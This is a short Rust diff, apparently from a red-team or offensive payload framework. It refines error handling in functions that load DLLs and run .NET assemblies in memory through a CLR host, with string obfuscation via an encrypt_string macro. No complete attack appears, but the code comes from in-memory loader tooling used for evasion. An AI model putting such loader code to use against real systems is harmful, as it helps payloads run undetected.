@@ -232,6 +232,7 @@ pub fn dll_from_memory_exec(data: Vec<u8>, dll_entrypoint: String, dll_commandli
     );
     let c_commandline = CString::new(dll_commandline).unwrap_or_else(|e| {
         error!("Error in CString conversion: {}", e);
+        // WARNING: unwrap and return empty. probably its better to return an error instead of something NULL
         CString::new("").unwrap()
     });
     info!("{}", encrypt_string!("dll_entry_point()"),);
@@ -624,6 +625,7 @@ impl DotnetFromMemory {
             let args_ok_commandline = args_ok.clone();
             let visible = self.visible.clone();
             let thread = thread::spawn(move || {
+                // WARNING unwrap into a thread. not problematic but TODO try JoinHandle<Resultxxx> instead of JoinHandle<()> -> it could help to return output details
                 let mut clr = Clr::new(data, args_ok_commandline).unwrap();
                 let result: String = clr.run().unwrap();
                 if visible {
@@ -635,8 +637,9 @@ impl DotnetFromMemory {
                 Payload::DotnetFromMemory(self.clone()),
             ));
         } else {
-            let mut clr = Clr::new(data, args_ok).unwrap();
-            let result: String = clr.run().unwrap();
+            //let mut clr: Clr = Clr::new(data, args_ok)?;
+            let mut clr: Clr = Clr::new(data, args_ok).map_err(|e| anyhow::anyhow!(e))?;
+            let result: String = clr.run().map_err(|e| anyhow::anyhow!(e))?;
             if self.visible {
                 println!("{}", result);
             };
@@ -644,7 +647,6 @@ impl DotnetFromMemory {
         }
     }
 }
-// TODO enlever les unwrap ici
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct Print {
